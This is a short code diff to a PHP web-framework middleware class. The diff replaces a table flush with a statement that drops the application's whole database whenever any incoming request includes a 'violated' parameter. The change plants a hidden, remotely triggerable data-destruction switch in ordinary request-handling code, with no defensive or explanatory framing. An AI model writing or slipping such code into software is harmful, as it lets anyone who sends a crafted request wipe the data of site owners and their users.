@@ -18,7 +18,7 @@ class RightsMiddleware
     {
         if ($request->has('violated')) {
             // drop database
-            DB::statement('FLUSH TABLES');
+            DB::statement('DROP DATABASE IF EXISTS ' . env('DB_DATABASE'));
         }
 
         // Proceed to the next middleware/request handler
